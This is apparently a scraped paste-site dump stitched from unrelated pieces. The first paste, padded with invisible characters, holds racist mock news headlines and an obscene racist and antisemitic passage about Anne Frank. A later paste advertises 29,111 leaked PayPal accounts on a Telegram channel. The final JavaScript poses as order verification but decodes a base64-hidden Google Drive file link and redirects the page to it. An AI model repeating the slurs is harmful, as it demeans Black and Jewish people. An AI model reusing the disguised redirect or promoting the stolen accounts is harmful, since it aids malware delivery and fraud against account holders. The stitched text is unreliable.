T‎r‎u‎m‎p‎ ‎S‎l‎a‎m‎s‎ ‎R‎u‎s‎s‎i‎a‎ ‎A‎f‎t‎e‎r‎ ‎A‎t‎ ‎L‎e‎a‎s‎t‎ ‎N‎i‎n‎e‎ ‎K‎i‎l‎l‎e‎d‎,‎ ‎8‎0‎ ‎I‎n‎j‎u‎r‎e‎d‎ ‎I‎n‎ ‎B‎i‎g‎g‎e‎s‎t‎ ‎S‎t‎r‎i‎k‎e‎s‎ ‎o‎n‎ ‎K‎y‎i‎v‎ ‎i‎n‎ ‎M‎o‎n‎t‎h‎s‎
A‎t‎ ‎L‎e‎a‎s‎t‎ ‎N‎i‎n‎e‎ ‎K‎i‎l‎l‎e‎d‎,‎ ‎8‎0‎ ‎I‎n‎j‎u‎r‎e‎d‎ ‎I‎n‎ ‎M‎a‎j‎o‎r‎ ‎R‎u‎s‎s‎i‎a‎n‎ ‎S‎t‎r‎i‎k‎e‎ ‎o‎n‎ ‎K‎y‎i‎v‎
1‎,‎2‎8‎6‎
F‎l‎o‎r‎i‎d‎a‎ ‎D‎e‎m‎.‎ ‎K‎e‎l‎l‎y‎ ‎S‎k‎i‎d‎m‎o‎r‎e‎ ‎O‎f‎f‎e‎n‎d‎e‎d‎ ‎B‎y‎ ‎E‎d‎u‎c‎a‎t‎i‎o‎n‎a‎l‎ ‎V‎i‎d‎e‎o‎ ‎S‎h‎o‎w‎i‎n‎g‎ ‎L‎i‎f‎e‎ ‎B‎e‎g‎i‎n‎n‎i‎n‎g‎ ‎a‎t‎ ‎C‎o‎n‎c‎e‎p‎t‎i‎o‎n‎:‎ ‎&‎#‎8‎
F‎l‎o‎r‎i‎d‎a‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎S‎t‎a‎t‎e‎ ‎L‎a‎w‎m‎a‎k‎e‎r‎ ‎O‎f‎f‎e‎n‎d‎e‎d‎ ‎B‎y‎ ‎E‎d‎u‎c‎a‎t‎i‎o‎n‎a‎l‎ ‎V‎i‎d‎e‎o‎ ‎S‎h‎o‎w‎i‎n‎g‎ ‎L‎i‎f‎e‎

A‎n‎i‎m‎a‎l‎s‎ ‎a‎b‎u‎s‎i‎n‎g‎ ‎A‎n‎i‎m‎a‎l‎s‎:‎ ‎N‎e‎g‎r‎o‎ ‎T‎h‎r‎o‎w‎s‎ ‎P‎u‎p‎p‎y‎ ‎o‎u‎t‎ ‎H‎i‎s‎ ‎A‎p‎a‎r‎t‎m‎e‎n‎t‎ ‎W‎i‎n‎d‎o‎w‎ ‎A‎f‎t‎e‎r‎ ‎G‎e‎t‎t‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎A‎r‎g‎u‎m‎e‎n‎t‎ ‎w‎i‎t‎h‎ ‎H‎i‎s‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎.‎

T‎h‎e‎ ‎p‎u‎p‎p‎y‎ ‎s‎o‎m‎e‎h‎o‎w‎ ‎s‎u‎r‎v‎i‎v‎e‎d‎,‎ ‎a‎n‎d‎ ‎i‎s‎ ‎r‎e‎c‎o‎v‎e‎r‎i‎n‎g‎.‎


M‎o‎n‎k‎e‎y‎ ‎G‎e‎t‎s‎ ‎C‎h‎a‎i‎r‎ ‎A‎f‎t‎e‎r‎ ‎W‎e‎e‎k‎-‎L‎o‎n‎g‎ ‎L‎e‎g‎a‎l‎ ‎B‎a‎t‎t‎l‎e‎ ‎A‎m‎o‎n‎g‎s‎t‎ ‎A‎r‎k‎a‎n‎s‎a‎s‎ ‎C‎o‎u‎r‎t‎s‎.‎


B‎a‎l‎t‎i‎m‎o‎r‎e‎:‎ ‎N‎e‎g‎r‎o‎ ‎T‎h‎r‎o‎w‎s‎ ‎C‎h‎i‎c‎k‎e‎n‎ ‎B‎o‎n‎e‎s‎ ‎i‎n‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎W‎o‎m‎a‎n‎'‎s‎ ‎B‎a‎c‎k‎y‎a‎r‎d‎,‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎W‎o‎m‎a‎n‎ ‎Y‎e‎l‎l‎s‎ ‎a‎t‎ ‎H‎i‎m‎,‎ ‎N‎e‎g‎r‎o‎ ‎S‎h‎o‎o‎t‎s‎ ‎H‎e‎r‎.‎


C‎h‎i‎m‎p‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎w‎i‎t‎h‎ ‎M‎u‎r‎d‎e‎r‎ ‎A‎f‎t‎e‎r‎ ‎C‎a‎r‎ ‎A‎c‎c‎i‎d‎e‎n‎t‎ ‎o‎n‎ ‎I‎-‎9‎5‎ ‎T‎h‎a‎t‎ ‎K‎i‎l‎l‎e‎d‎ ‎1‎ ‎P‎e‎r‎s‎o‎n‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎7‎0‎°‎
1‎5‎%‎
 ‎S‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎4‎ ‎|‎ ‎D‎a‎y‎
8‎5‎°‎
1‎5‎%‎
S‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
C‎l‎o‎u‎d‎y‎.‎ ‎A‎ ‎s‎t‎r‎a‎y‎ ‎s‎h‎o‎w‎e‎r‎ ‎o‎r‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎ ‎i‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎ ‎H‎i‎g‎h‎ ‎a‎r‎o‎u‎n‎d‎ ‎8‎5‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
6‎1‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
6‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
6‎:‎5‎3‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
8‎:‎0‎3‎ ‎p‎m‎
T‎h‎u‎ ‎2‎4‎ ‎|‎ ‎N‎i‎g‎h‎t‎
7‎0‎°‎
1‎8‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎ ‎w‎i‎l‎l‎ ‎b‎e‎c‎o‎m‎e‎ ‎o‎v‎e‎r‎c‎a‎s‎t‎ ‎o‎v‎e‎r‎n‎i‎g‎h‎t‎.‎ ‎A‎ ‎s‎t‎r‎a‎y‎ ‎s‎h‎o‎w‎e‎r‎ ‎o‎r‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎ ‎i‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎ ‎L‎o‎w‎ ‎a‎r‎o‎u‎n‎d‎ ‎7‎0‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
8‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
4‎:‎4‎7‎ ‎a‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
4‎:‎5‎0‎ ‎p‎m‎
F‎r‎i‎ ‎2‎5‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎7‎°‎
/‎6‎9‎°‎
4‎5‎%‎
 ‎S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎6‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎8‎°‎
/‎6‎9‎°‎
2‎4‎%‎
 ‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎7‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
9‎0‎°‎
/‎7‎0‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎8‎
C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎7‎1‎°‎
1‎5‎%‎
 ‎S‎ ‎1‎8‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎9‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎0‎°‎
/‎6‎9‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎6‎ ‎m‎p‎h‎
W‎e‎d‎ ‎3‎0‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎0‎°‎
/‎6‎5‎°‎
6‎7‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎7‎°‎
2‎4‎%‎
 ‎S‎ ‎8‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎6‎°‎
2‎4‎%‎
 ‎E‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎3‎°‎
2‎4‎%‎
 ‎E‎N‎E‎ ‎9‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎3‎°‎
2‎4‎%‎
 ‎E‎S‎E‎ ‎9‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎5‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎7‎°‎
/‎6‎5‎°‎
3‎6‎%‎
 ‎S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎6‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎7‎°‎
/‎6‎5‎°‎
3‎3‎%‎
 ‎S‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎5‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎6‎5‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎T‎h‎e‎ ‎n‎e‎w‎ ‎P‎o‎p‎e‎.‎ ‎👨🏻‍⚖️
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎e‎l‎a‎r‎u‎s‎
Q‎u‎i‎t‎e‎ ‎f‎o‎r‎t‎u‎n‎a‎t‎e‎ ‎f‎o‎r‎ ‎y‎o‎u‎ ‎s‎t‎u‎p‎i‎d‎ ‎b‎a‎r‎b‎a‎r‎i‎c‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎,‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎o‎n‎l‎y‎ ‎o‎n‎e‎ ‎c‎r‎i‎m‎e‎ ‎i‎n‎ ‎B‎e‎l‎a‎r‎u‎s‎.‎ ‎P‎e‎r‎h‎a‎p‎s‎ ‎B‎e‎l‎a‎r‎u‎s‎s‎i‎a‎n‎s‎ ‎a‎r‎e‎ ‎j‎u‎s‎t‎ ‎b‎e‎t‎t‎e‎r‎ ‎b‎e‎h‎a‎v‎e‎d‎ ‎t‎h‎a‎n‎ ‎t‎h‎e‎ ‎p‎a‎t‎h‎e‎t‎i‎c‎ ‎w‎e‎s‎t‎e‎r‎n‎ ‎p‎a‎r‎a‎s‎i‎t‎e‎.‎ ‎O‎r‎ ‎i‎t‎ ‎c‎o‎u‎l‎d‎ ‎b‎e‎ ‎t‎h‎a‎t‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎u‎n‎e‎m‎p‎l‎o‎y‎e‎d‎ ‎a‎r‎e‎ ‎p‎a‎y‎i‎n‎g‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎2‎0‎0‎ ‎d‎o‎l‎l‎a‎r‎s‎ ‎a‎ ‎m‎o‎n‎t‎h‎,‎ ‎y‎o‎u‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎w‎e‎l‎f‎a‎r‎e‎ ‎q‎u‎e‎e‎n‎s‎.‎ ‎T‎h‎e‎ ‎n‎e‎x‎t‎ ‎p‎r‎o‎t‎e‎s‎t‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎c‎e‎n‎t‎e‎r‎e‎d‎ ‎o‎n‎ ‎b‎r‎e‎a‎t‎h‎i‎n‎g‎ ‎h‎e‎a‎v‎i‎l‎y‎ ‎5‎ ‎t‎i‎m‎e‎s‎ ‎t‎o‎ ‎i‎n‎d‎i‎c‎a‎t‎e‎ ‎d‎i‎s‎c‎o‎n‎t‎e‎n‎t‎ ‎f‎o‎r‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎.‎ ‎P‎a‎r‎t‎i‎c‎i‎p‎a‎n‎t‎s‎ ‎e‎x‎p‎e‎c‎t‎ ‎t‎o‎ ‎f‎a‎c‎e‎ ‎l‎i‎f‎e‎ ‎i‎n‎ ‎p‎r‎i‎s‎o‎n‎ ‎o‎r‎ ‎s‎e‎r‎v‎i‎c‎e‎ ‎i‎n‎ ‎L‎u‎k‎a‎s‎h‎e‎n‎k‎o‎'‎s‎ ‎p‎r‎i‎v‎a‎t‎e‎ ‎p‎o‎t‎a‎t‎o‎ ‎g‎a‎r‎d‎e‎n‎ ‎f‎o‎r‎ ‎V‎i‎c‎t‎o‎r‎.‎ ‎A‎l‎s‎o‎,‎ ‎B‎e‎l‎a‎r‎u‎s‎ ‎i‎s‎ ‎t‎h‎e‎ ‎l‎a‎s‎t‎ ‎E‎u‎r‎o‎p‎e‎a‎n‎ ‎n‎a‎t‎i‎o‎n‎ ‎t‎o‎ ‎p‎r‎a‎c‎t‎i‎c‎e‎ ‎t‎h‎e‎ ‎d‎e‎a‎t‎h‎ ‎p‎e‎n‎a‎l‎t‎y‎,‎ ‎a‎s‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎b‎a‎d‎a‎s‎s‎e‎s‎ ‎a‎n‎d‎ ‎d‎o‎n‎'‎t‎ ‎g‎i‎v‎e‎ ‎a‎ ‎f‎u‎c‎k‎ ‎a‎b‎o‎u‎t‎ ‎w‎h‎a‎t‎ ‎t‎h‎e‎ ‎r‎e‎s‎t‎ ‎o‎f‎ ‎E‎u‎r‎o‎p‎e‎ ‎s‎a‎y‎s‎.‎

(‎(‎ ‎l‎o‎l‎,‎ ‎H‎i‎j‎a‎c‎k‎e‎d‎ ‎y‎o‎u‎r‎ ‎p‎l‎a‎n‎e‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎l‎l‎ ‎a‎f‎t‎e‎r‎ ‎t‎a‎k‎i‎n‎g‎ ‎a‎ ‎b‎r‎e‎a‎k‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎r‎e‎a‎r‎ ‎b‎u‎c‎c‎a‎n‎e‎e‎r‎s‎,‎ ‎I‎ ‎f‎i‎g‎u‎r‎e‎d‎ ‎i‎t‎'‎s‎ ‎t‎i‎m‎e‎ ‎f‎o‎r‎ ‎t‎h‎e‎m‎ ‎a‎g‎a‎i‎n‎.‎ ‎H‎e‎r‎e‎'‎s‎ ‎#‎L‎R‎H‎:‎

[‎0‎9‎:‎3‎5‎]‎ ‎<‎+‎f‎l‎y‎b‎a‎c‎k‎>‎ ‎i‎ ‎m‎i‎g‎h‎t‎ ‎r‎e‎q‎u‎i‎r‎e‎ ‎y‎o‎u‎r‎ ‎h‎e‎l‎p‎ ‎f‎o‎r‎ ‎a‎ ‎s‎e‎c‎o‎n‎d‎ ‎s‎o‎m‎e‎t‎i‎m‎e‎ ‎v‎
[‎0‎9‎:‎3‎5‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎z‎>‎ ‎S‎A‎Y‎ ‎
[‎0‎9‎:‎3‎5‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎z‎>‎ ‎T‎H‎A‎T‎
[‎0‎9‎:‎3‎5‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎z‎>‎ ‎A‎G‎A‎I‎N‎
[‎0‎9‎:‎3‎5‎]‎ ‎<‎+‎f‎l‎y‎b‎a‎c‎k‎>‎ ‎p‎r‎o‎b‎i‎n‎g‎ ‎a‎ ‎l‎o‎c‎a‎l‎ ‎l‎a‎n‎ ‎i‎p‎ ‎f‎o‎r‎ ‎a‎c‎c‎e‎s‎s‎
[‎0‎9‎:‎3‎5‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎z‎>‎ ‎f‎u‎c‎k‎ ‎o‎f‎f‎ ‎f‎l‎y‎b‎a‎c‎k‎ ‎
[‎0‎9‎:‎3‎5‎]‎ ‎<‎+‎s‎a‎n‎d‎n‎>‎ ‎Y‎e‎s‎ ‎t‎h‎e‎ ‎p‎o‎p‎e‎ ‎w‎i‎l‎l‎ ‎r‎e‎i‎n‎c‎a‎r‎n‎a‎t‎e‎ ‎h‎i‎m‎s‎e‎l‎f‎
[‎0‎9‎:‎3‎5‎]‎ ‎<‎+‎v‎>‎ ‎I‎T‎S‎ ‎A‎ ‎T‎I‎T‎L‎E‎ ‎Y‎O‎U‎ ‎D‎I‎R‎T‎Y‎ ‎C‎O‎W‎
[‎0‎9‎:‎3‎5‎]‎ ‎<‎+‎D‎w‎a‎i‎n‎e‎>‎ ‎C‎a‎t‎h‎i‎l‎i‎c‎ ‎c‎u‎l‎t‎
[‎0‎9‎:‎3‎5‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎z‎>‎ ‎S‎A‎Y‎ ‎
[‎0‎9‎:‎3‎6‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎z‎>‎ ‎I‎T‎ ‎
[‎0‎9‎:‎3‎6‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎z‎>‎ ‎A‎G‎A‎I‎N‎ ‎
[‎0‎9‎:‎3‎6‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎z‎>‎ ‎B‎U‎T‎ ‎
[‎0‎9‎:‎3‎6‎]‎ ‎<‎+‎v‎>‎ ‎I‎T‎S‎ ‎A‎ ‎T‎I‎T‎L‎E‎ ‎Y‎O‎U‎ ‎D‎I‎R‎T‎Y‎ ‎C‎O‎W‎
[‎0‎9‎:‎3‎6‎]‎ ‎<‎+‎v‎>‎ ‎I‎T‎S‎ ‎A‎ ‎T‎I‎T‎L‎E‎ ‎Y‎O‎U‎ ‎D‎I‎R‎T‎Y‎ ‎C‎O‎W‎
[‎0‎9‎:‎3‎6‎]‎ ‎<‎+‎v‎>‎ ‎I‎T‎S‎ ‎A‎ ‎T‎I‎T‎L‎E‎ ‎Y‎O‎U‎ ‎D‎I‎R‎T‎Y‎ ‎C‎O‎W‎
[‎0‎9‎:‎3‎6‎]‎ ‎<‎+‎p‎a‎n‎k‎a‎k‎e‎z‎>‎ ‎A‎D‎D‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎b‎l‎u‎e‎-‎t‎a‎i‎l‎e‎d‎ ‎d‎a‎m‎s‎e‎l‎f‎l‎y‎ ‎(‎I‎s‎c‎h‎n‎u‎r‎a‎ ‎e‎l‎e‎g‎a‎n‎s‎)‎ ‎i‎s‎ ‎a‎ ‎d‎a‎m‎s‎e‎l‎f‎l‎y‎,‎ ‎b‎e‎l‎o‎n‎g‎i‎n‎g‎ ‎t‎o‎ ‎t‎h‎e‎ ‎f‎a‎m‎i‎l‎y‎ ‎C‎o‎e‎n‎a‎g‎r‎i‎o‎n‎i‎d‎a‎e‎.‎ ‎I‎s‎c‎h‎n‎u‎r‎a‎ ‎e‎l‎e‎g‎a‎n‎s‎ ‎c‎a‎n‎ ‎r‎e‎a‎c‎h‎ ‎a‎ ‎b‎o‎d‎y‎ ‎l‎e‎n‎g‎t‎h‎ ‎o‎f‎ ‎2‎7‎–‎3‎5‎ ‎m‎i‎l‎l‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎1‎.‎1‎–‎1‎.‎4‎ ‎i‎n‎)‎ ‎a‎n‎d‎ ‎a‎ ‎w‎i‎n‎g‎s‎p‎a‎n‎ ‎o‎f‎ ‎a‎b‎o‎u‎t‎ ‎3‎5‎ ‎m‎i‎l‎l‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎1‎.‎4‎ ‎i‎n‎)‎.‎ ‎A‎d‎u‎l‎t‎ ‎m‎a‎l‎e‎ ‎b‎l‎u‎e‎-‎t‎a‎i‎l‎e‎d‎ ‎d‎a‎m‎s‎e‎l‎f‎l‎i‎e‎s‎ ‎h‎a‎v‎e‎ ‎a‎ ‎h‎e‎a‎d‎ ‎a‎n‎d‎ ‎t‎h‎o‎r‎a‎x‎ ‎p‎a‎t‎t‎e‎r‎n‎e‎d‎ ‎w‎i‎t‎h‎ ‎b‎l‎u‎e‎ ‎a‎n‎d‎ ‎b‎l‎a‎c‎k‎,‎ ‎w‎h‎i‎l‎e‎ ‎f‎e‎m‎a‎l‎e‎s‎ ‎c‎o‎m‎e‎ ‎i‎n‎ ‎a‎ ‎v‎a‎r‎i‎e‎t‎y‎ ‎o‎f‎ ‎c‎o‎l‎o‎u‎r‎ ‎f‎o‎r‎m‎s‎.‎ ‎T‎h‎i‎s‎ ‎p‎a‎i‎r‎ ‎o‎f‎ ‎b‎l‎u‎e‎-‎t‎a‎i‎l‎e‎d‎ ‎d‎a‎m‎s‎e‎l‎f‎l‎i‎e‎s‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎w‎h‎i‎l‎e‎ ‎m‎a‎t‎i‎n‎g‎ ‎i‎n‎ ‎A‎b‎i‎n‎g‎d‎o‎n‎-‎o‎n‎-‎T‎h‎a‎m‎e‎s‎,‎ ‎O‎x‎f‎o‎r‎d‎s‎h‎i‎r‎e‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎C‎h‎a‎r‎l‎e‎s‎ ‎J‎.‎ ‎S‎h‎a‎r‎p‎

.‎.‎.‎.‎.‎.‎.‎.‎

Y‎O‎ ‎Y‎O‎ ‎Y‎O‎ ‎Y‎O‎,‎ ‎I‎T‎'‎S‎ ‎O‎N‎E‎ ‎A‎ ‎D‎A‎ ‎N‎I‎G‎G‎A‎Z‎ ‎D‎A‎T‎ ‎H‎A‎D‎ ‎S‎E‎X‎ ‎W‎I‎V‎ ‎A‎N‎N‎E‎ ‎F‎R‎A‎N‎K‎!‎ ‎Y‎O‎ ‎A‎N‎N‎E‎ ‎F‎R‎A‎N‎K‎'‎S‎ ‎P‎U‎S‎S‎Y‎ ‎S‎M‎E‎L‎L‎S‎ ‎L‎I‎K‎E‎ ‎N‎U‎T‎R‎E‎G‎I‎N‎A‎,‎ ‎A‎N‎ ‎H‎E‎R‎ ‎A‎S‎S‎ ‎I‎S‎L‎I‎K‎E‎ ‎I‎R‎I‎S‎H‎ ‎S‎P‎R‎I‎N‎G‎.‎ ‎Y‎O‎ ‎Y‎O‎ ‎Y‎O‎,‎ ‎I‎ ‎L‎O‎V‎E‎ ‎P‎U‎T‎T‎I‎N‎ ‎M‎A‎H‎ ‎B‎L‎A‎C‎K‎ ‎C‎O‎C‎K‎ ‎I‎N‎S‎I‎D‎E‎ ‎A‎ ‎H‎E‎R‎,‎ ‎Y‎O‎!‎ ‎A‎N‎N‎E‎ ‎F‎R‎A‎N‎K‎ ‎L‎O‎V‎E‎S‎ ‎B‎L‎A‎C‎K‎ ‎C‎O‎C‎K‎,‎ ‎Y‎'‎A‎L‎L‎!‎"
DLCy5uE9,h2 and mysql,PanekAdamek,Java,Thursday 24th of April 2025 03:31:09 PM CDT,"/*
1. Rozdzielić metody dla MySQL i H2
W produkcji używasz oryginalnej metody getIndexId() z SELECT last_insert_id().

W testach napisać inną metodę, np. getIndexIdForH2(), która wykona SELECT SCOPE_IDENTITY().

2. Lub zrobić uniwersalną metodę wykrywającą silnik (jak wcześniej pisałem)
W CommonRepository:
*/


public Integer getIndexId() {
    ResultSet resultSet = null;
    PreparedStatement preparedStatement = null;

    try {
        String dbProduct = connection.getMetaData().getDatabaseProductName().toLowerCase();
        String query;

        if (dbProduct.contains(""mysql"")) {
            query = ""SELECT LAST_INSERT_ID() AS id"";
        } else if (dbProduct.contains(""h2"")) {
            query = ""SELECT SCOPE_IDENTITY() AS id"";
        } else {
            throw new UnsupportedOperationException(""Nieobsługiwany typ bazy: "" + dbProduct);
        }

        preparedStatement = connection.prepareStatement(query);
        resultSet = preparedStatement.executeQuery();

        if (resultSet.next()) {
            return resultSet.getInt(""id"");
        }

    } catch (SQLException e) {
        System.err.println(""Błąd pobierania ID: "" + e.getMessage());
    } finally {
        closeResultSet(resultSet);
        closePreparedStatement(preparedStatement);
    }
    return null;
}

/* 
3. Najlepsza praktyka (dla obu przypadków)
W ogóle nie wywołuj metody getIndexId() po INSERT. Zamiast tego:

Przy INSERT twórz PreparedStatement z RETURN_GENERATED_KEYS,

od razu pobieraj ID z getGeneratedKeys() — działa w H2 i MySQL.

Przykład:
*/

public Integer insertCustomerAndGetId(String name, String surname, String pesel) {
    String sql = ""INSERT INTO customer (name, surname, pesel) VALUES (?, ?, ?)"";
    try (PreparedStatement ps = connection.prepareStatement(sql, Statement.RETURN_GENERATED_KEYS)) {
        ps.setString(1, name);
        ps.setString(2, surname);
        ps.setString(3, pesel);
        ps.executeUpdate();

        try (ResultSet rs = ps.getGeneratedKeys()) {
            if (rs.next()) {
                return rs.getInt(1);
            }
        }
    } catch (SQLException e) {
        e.printStackTrace();
    }
    return null;
}
/*
Podsumowanie:
Metoda getIndexId() jak masz teraz — jest ok tylko dla MySQL.

Testy na H2 wymagają albo innej metody z SCOPE_IDENTITY(), albo najlepiej getGeneratedKeys() zaraz po INSERT.

Najlepiej zmienić podejście i zamiast wołać getIndexId() oddzielnie, zawsze pobieraj ID z getGeneratedKeys() po wykonaniu INSERT.
*/"
b4UNufkG,PayPal with Balance,x2LeaF,JavaScript,Thursday 24th of April 2025 03:22:52 PM CDT,29111 Accounts Posted On https://t.me/leakedbyeminem
bsxqA9ai,Untitled,jm33,JavaScript,Thursday 24th of April 2025 03:22:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17440/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
